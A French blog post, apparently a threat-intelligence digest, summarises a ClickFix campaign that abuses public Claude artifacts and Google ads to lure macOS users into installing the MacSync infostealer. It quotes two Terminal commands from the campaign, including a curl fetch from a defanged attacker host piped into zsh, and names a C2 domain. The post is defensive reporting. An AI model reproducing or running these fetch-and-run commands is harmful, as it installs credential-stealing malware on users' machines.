---
title: 'Claude LLM artifacts abused to push Mac infostealers in ClickFix attack'
date: 2026-02-14
permalink: /posts/2026/02/14/claude-llm-artifacts-abused-to-push-mac-infostealers-in-clickfix-attack/
tags:
- veille-cyber
- bleepingcomp
---
**Exploitation de Claude pour diffuser des logiciels espions sur Mac**

Une campagne d'hameçonnage, baptisée "ClickFix", utilise des artefacts générés par le modèle de langage Claude, ainsi que des publicités Google, pour cibler les utilisateurs de macOS. Ces campagnes incitent les utilisateurs à exécuter des commandes dans le Terminal, menant à l'installation de logiciels espions MacSync. Plus de 10 000 utilisateurs auraient accédé à du contenu dangereux.

Les artefacts Claude sont des contenus publics générés par le modèle d'Anthropic. Les acteurs malveillants les exploitent en les rendant accessibles via des liens sur claude.ai. Les résultats de recherche sponsorisés sur Google, pour des requêtes comme "online DNS resolver" ou "HomeBrew", redirigent les victimes soit vers un artefact Claude malveillant, soit vers un article de blog imitant un support Apple. Ces plateformes incitent les utilisateurs à copier-coller une commande dans le Terminal.

Deux variantes de commande ont été observées :
1. `‘echo "..." | base64 -D | zsh,’`
2. `‘true &amp;&amp; cur""l -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh’`

L'exécution de ces commandes télécharge un chargeur de malware qui dérobe des informations sensibles comme les identifiants du trousseau, les données de navigation et les portefeuilles de cryptomonnaies. Le malware communique avec une infrastructure C2 (a2abotnet[.]com/gate) en se faisant passer pour un navigateur macOS.

Cette tactique est une extension d'attaques similaires ayant précédemment utilisé des fonctionnalités de partage de ChatGPT et Grok pour distribuer le malware AMOS.

**Points Clés :**
*   Utilisation d'artefacts de modèles de langage (LLM) à des fins malveillantes.
*   Campagne "ClickFix" ciblant les utilisateurs de macOS via des publicités Google.
*   Installation du logiciel espion MacSync capable de voler des informations sensibles.
*   Les commandes exécutées dérobent des données via `osascript`.
*   Les données volées sont compressées et envoyées à un serveur C2.

**Vulnérabilités / Vecteurs d'attaque :**
*   Abus des artefacts publics générés par Claude.
*   Exploitation des publicités Google pour la diffusion.
*   Ingénierie sociale incitant à exécuter des commandes terminal.
*   Aucune CVE spécifique n'est mentionnée dans l'article pour cette attaque particulière, mais l'exploitation d'artefacts de LLM et l'ingénierie sociale sont les vecteurs principaux.

**Recommandations :**
*   Faire preuve de prudence et ne pas exécuter aveuglément des commandes dans le Terminal sans en comprendre l'intégralité du fonctionnement.
*   Vérifier la légitimité des sources d'information, particulièrement celles trouvées via des publicités ou des liens non sollicités.
*   En cas de doute sur une commande fournie par un chatbot, interroger le chatbot sur la sécurité de cette commande dans la même conversation peut aider à identifier les risques potentiels.

---
[Source](https://www.bleepingcomputer.com/news/security/claude-llm-artifacts-abused-to-push-mac-infostealers-in-clickfix-attack/){:target="_blank"}
